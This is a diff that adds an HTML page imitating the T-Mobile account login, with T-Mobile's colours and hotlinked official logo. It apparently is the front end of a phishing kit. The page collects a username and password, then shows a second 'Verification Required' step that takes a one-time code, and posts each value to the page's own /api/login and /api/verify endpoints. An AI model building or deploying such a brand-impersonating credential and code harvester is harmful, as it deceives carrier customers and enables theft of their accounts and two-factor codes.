@@ -1,0 +1,226 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>T-Mobile Account Login</title>
+    <style>
+        body {
+            font-family: 'T-Mobile Sans', Arial, sans-serif;
+            background-color: #e20074;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+
+        .login-container {
+            background-color: white;
+            width: 100%;
+            max-width: 400px;
+            padding: 30px;
+            border-radius: 8px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+        }
+
+        .logo {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+
+        .logo img {
+            max-width: 150px;
+        }
+
+        .login-form h2 {
+            color: #333;
+            margin-bottom: 20px;
+            text-align: center;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        .form-group input {
+            width: 100%;
+            padding: 15px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            font-size: 16px;
+            box-sizing: border-box;
+        }
+
+        .login-btn, .verify-btn {
+            width: 100%;
+            padding: 15px;
+            background-color: #e20074;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            font-size: 16px;
+            cursor: pointer;
+            transition: background-color 0.3s;
+        }
+
+        .login-btn:hover, .verify-btn:hover {
+            background-color: #c4005c;
+        }
+
+        .form-links {
+            margin-top: 20px;
+            text-align: center;
+        }
+
+        .form-links a {
+            color: #0099cc;
+            text-decoration: none;
+        }
+
+        .hidden {
+            display: none;
+        }
+
+        #verification-container {
+            text-align: center;
+        }
+
+        #verification-container h2 {
+            color: #333;
+            margin-bottom: 15px;
+        }
+
+        #verification-container p {
+            color: #666;
+            margin-bottom: 20px;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <div class="logo">
+            <img src="https://www.t-mobile.com/content/dam/t-mobile/en-p/brand/tmo-logo.svg" alt="T-Mobile">
+        </div>
+        
+        <div class="login-form">
+            <h2>Log in to your T-Mobile account</h2>
+            <form id="login-form">
+                <div class="form-group">
+                    <input type="text" id="username" name="username" placeholder="Phone number or email" required>
+                </div>
+                
+                <div class="form-group">
+                    <input type="password" id="password" name="password" placeholder="Password" required>
+                </div>
+                
+                <button type="submit" id="login-btn">Log in</button>
+            </form>
+            
+            <div class="form-links">
+                <a href="#" id="forgot-link">Forgot username or password?</a>
+            </div>
+        </div>
+        
+        <div id="verification-container" class="hidden">
+            <h2>Verification Required</h2>
+            <p>We've sent a verification code to your device.</p>
+            <form id="verification-form">
+                <div class="form-group">
+                    <input type="text" id="verification-code" placeholder="Enter verification code" required>
+                </div>
+                <button type="submit" id="verify-btn">Verify</button>
+            </form>
+        </div>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            const loginForm = document.getElementById('login-form');
+            const verificationForm = document.getElementById('verification-form');
+            const loginContainer = document.querySelector('.login-form');
+            const verificationContainer = document.getElementById('verification-container');
+            
+            loginForm.addEventListener('submit', function(e) {
+                e.preventDefault();
+                
+                const username = document.getElementById('username').value;
+                const password = document.getElementById('password').value;
+                
+                // Show loading state
+                document.getElementById('login-btn').textContent = 'Logging in...';
+                document.getElementById('login-btn').disabled = true;
+                
+                // Send credentials to backend
+                fetch('/api/login', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({ username, password })
+                })
+                .then(response => response.json())
+                .then(data => {
+                    if (data.requiresVerification) {
+                        // Show verification form
+                        loginContainer.classList.add('hidden');
+                        verificationContainer.classList.remove('hidden');
+                    } else if (data.success) {
+                        // Redirect to success page or dashboard
+                        window.location.href = '/dashboard';
+                    } else {
+                        // Show error
+                        alert(data.message || 'Login failed. Please try again.');
+                        document.getElementById('login-btn').textContent = 'Log in';
+                        document.getElementById('login-btn').disabled = false;
+                    }
+                })
+                .catch(error => {
+                    console.error('Error:', error);
+                    alert('An error occurred. Please try again.');
+                    document.getElementById('login-btn').textContent = 'Log in';
+                    document.getElementById('login-btn').disabled = false;
+                });
+            });
+            
+            verificationForm.addEventListener('submit', function(e) {
+                e.preventDefault();
+                
+                const code = document.getElementById('verification-code').value;
+                
+                // Show loading state
+                document.getElementById('verify-btn').textContent = 'Verifying...';
+                document.getElementById('verify-btn').disabled = true;
+                
+                // Send verification code to backend
+                fetch('/api/verify', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({ code })
+                })
+                .then(response => response.json())
+                .then(data => {
+                    if (data.success) {
+                        // Redirect to success page or dashboard
+                        window.location.href = '/dashboard';
+                    } else {
+                        // Show error
+                        alert(data.message || 'Verification failed. Please try again.');
+                        document.getElementById('verify-btn').textContent = 'Verify';
+                        document.getElementById('verify-btn').disabled = false;
+                    }
+                })
+                .catch(error => {
+                    console.error('Error:', error);
+                    alert('An error occurred. Please try again.');
+                    document.getElementById('verify-btn').textContent = 'Verify';
+                    document.getElementById('verify-btn').disabled = false;
+                });
+            });
+        });
+    </script>
+</body>
+</html>
